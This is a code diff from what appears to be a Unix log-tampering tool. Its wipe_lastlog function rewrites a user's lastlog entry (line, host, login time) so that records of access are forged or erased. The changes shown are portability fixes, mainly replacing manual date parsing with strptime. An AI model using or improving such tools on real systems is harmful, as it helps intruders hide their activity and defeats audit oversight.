@@ -15,6 +15,8 @@
 #define ut_name ut_user
 #endif
 
+#define _XOPEN_SOURCE 500
+
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/uio.h>
@@ -95,9 +97,13 @@
 
 char *arg0;
 
-char *basename(char *path) {
-	char *p = rindex(path, '/');
+inline char *basename(char *path) {
+	char *p = strrchr(path, '/');
 	return p ? p : path;
+}
+
+inline void bzero(void *s, size_t n) {
+	memset(s, 0, n);
 }
 
 /*
@@ -316,7 +322,6 @@ wipe_lastlog(char *who, char *line, char *timestr, char *host)
 	struct lastlog	ll;
 	struct passwd	*pwd;
 	struct tm	tm;
-	char		str[6];
 
 	printf("Patching %s .... ", LASTLOG_FILE);
 	fflush(stdout);
@@ -341,40 +346,14 @@ wipe_lastlog(char *who, char *line, char *timestr, char *host)
 		strncpy(ll.ll_line, line, strlen(line));
 
 	if (timestr) {
-		/* YYYYMMddhhmm */
-		if (strlen(timestr) != 12) {
-			fprintf(stderr, "fatal: time must be specified as YYYYMMddhhmm\n");
+		char *r = strptime(timestr, "%Y%m%d%H%M", &tm);
+		if (!r) {
+			fprintf(stderr, "fatal: failed to parse datetime\n");
+			return;
+		} else if (*r) {
+			fprintf(stderr, "fatal: garbage after datetime: '%s'\n", r);
 			return;
 		}
-
-		/*
-		 * Extract Times.
-		 */
-		str[0] = timestr[0];
-		str[1] = timestr[1];
-		str[2] = timestr[2];
-		str[3] = timestr[3];
-		str[4] = 0;
-		tm.tm_year = atoi(str)-1900;
-
-		str[0] = timestr[4];
-		str[1] = timestr[5];
-		str[2] = 0;
-		tm.tm_mon = atoi(str)-1;
-
-		str[0] = timestr[6];
-		str[1] = timestr[7];
-		tm.tm_mday = atoi(str);
-
-		str[0] = timestr[8];
-		str[1] = timestr[9];
-		tm.tm_hour = atoi(str);
-
-		str[0] = timestr[10];
-		str[1] = timestr[11];
-		tm.tm_min = atoi(str);
-		tm.tm_sec = 0;
-
 		ll.ll_time = mktime(&tm);
 	}
 
